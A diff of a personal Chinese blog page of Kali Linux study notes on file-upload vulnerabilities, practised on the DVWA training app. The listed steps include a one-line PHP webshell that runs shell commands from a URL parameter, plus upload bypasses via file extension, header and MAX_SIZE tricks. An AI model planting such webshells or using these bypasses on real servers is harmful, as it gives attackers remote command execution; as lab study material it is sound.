@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="1. 手动漏洞挖掘- &amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt; 直接上传webshell 修改文件类型上传webshell Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg） 一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名   修改扩展名上传webshell 静态解析文件扩展名时可能无法">
+<meta name="description" content="1. 手动漏洞挖掘  直接上传webshell 修改文件类型上传webshell Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg） 一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名   修改扩展名上传webshell 静态解析文件扩展名时可能无法执行   文件头绕过过滤上传webshell 上传目录权限（上传权限限制，限制上传文件执行） DVWA的Upl">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;08&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 手动漏洞挖掘- &amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt; 直接上传webshell 修改文件类型上传webshell Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg） 一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名   修改扩展名上传webshell 静态解析文件扩展名时可能无法">
+<meta property="og:description" content="1. 手动漏洞挖掘  直接上传webshell 修改文件类型上传webshell Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg） 一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名   修改扩展名上传webshell 静态解析文件扩展名时可能无法执行   文件头绕过过滤上传webshell 上传目录权限（上传权限限制，限制上传文件执行） DVWA的Upl">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-08T13:59:21.435Z">
+<meta property="og:updated_time" content="2020-01-15T06:11:28.678Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -333,7 +333,8 @@
 
       
         <hr>
-<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><pre><code>- &lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;</code></pre><ul>
+<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><ul>
+<li><?php echo shell_exec($_GET['cmd']);?></li>
 <li>直接上传webshell</li>
 <li>修改文件类型上传webshell<ul>
 <li>Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg）</li>
@@ -348,7 +349,7 @@
 <li>上传目录权限（上传权限限制，限制上传文件执行）</li>
 <li>DVWA的Upload（low）：<ul>
 <li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
-<li>2.vi 1.php（<?php echo shell_exec($_GET['cmd']);?>）</li>
+<li>2.<strong><code>🔺命令：vi 1.php</code></strong>（<?php echo shell_exec($_GET['cmd']);?>）</li>
 <li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
 <li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
 </ul>
@@ -505,7 +506,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-count">58</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
